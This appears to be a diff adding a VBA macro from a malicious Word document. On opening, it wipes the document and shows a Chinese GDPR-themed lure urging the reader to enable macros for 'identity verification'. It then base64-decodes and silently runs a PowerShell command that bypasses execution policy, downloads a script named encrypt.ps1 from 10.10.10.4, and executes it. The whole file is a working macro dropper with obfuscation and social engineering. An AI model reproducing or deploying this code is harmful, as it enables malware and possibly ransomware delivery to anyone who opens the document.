@@ -1,0 +1,38 @@
+Function DecodeBase64(b64$)
+    Dim b
+    With CreateObject("Microsoft.XMLDOM").createElement("b64")
+        .DataType = "bin.base64": .Text = b64
+        b = .nodeTypedValue
+        With CreateObject("ADODB.Stream")
+            .Open: .Type = 1: .Write b: .Position = 0: .Type = 2: .Charset = "utf-8"
+            DecodeBase64 = .ReadText
+            .Close
+        End With
+    End With
+End Function
+Sub Document_Open()
+SubstitutePage
+End Sub
+Sub AutoOpen()
+SubstitutePage
+End Sub
+Sub SubstitutePage()
+ActiveDocument.Content.Select
+Selection.Delete
+NormalTemplate.AutoTextEntries.Add Name:="TheDoc5", _
+Range:=Selection.Range
+NormalTemplate.AutoTextEntries("TheDoc5").Value = _
+"因應歐盟一般資料保護規則(GDPR)之施行，提供XXXX LAB與主要部會相關因應措施之資料，為避免本部資料外洩，以下內容將會直接屏蔽，在啟用巨集後，將會驗證使用者身分，方可觀看內容。   " & "----------------------------------------------------------------------------------------------------------------------------------------------" & "假的"
+ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc5").Insert _
+Where:=Selection.Range, RichText:=True
+Dim b641 As String
+Dim b642 As String
+Dim cMd As String
+b641 = "Y21kLmV4ZSAvYyBwb3dlcnNoZWxsIC1lcCBieWFwc3Mg"
+b642 = "Ikludm9rZS1FeHByZXNzaW9uIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLiJEb3dubG9hZFN0cmluZyIoJ2h0JysndHA6Ly8xMC4xMC4xMC40L2VuY3J5cHQucHMxJyki"
+'MsgBox DecodeBase64(b641)
+'MsgBox DecodeBase64(b642)
+cMd = DecodeBase64(b641) & DecodeBase64(b642)
+'MsgBox cMd
+Shell cMd, vbHide
+End Sub
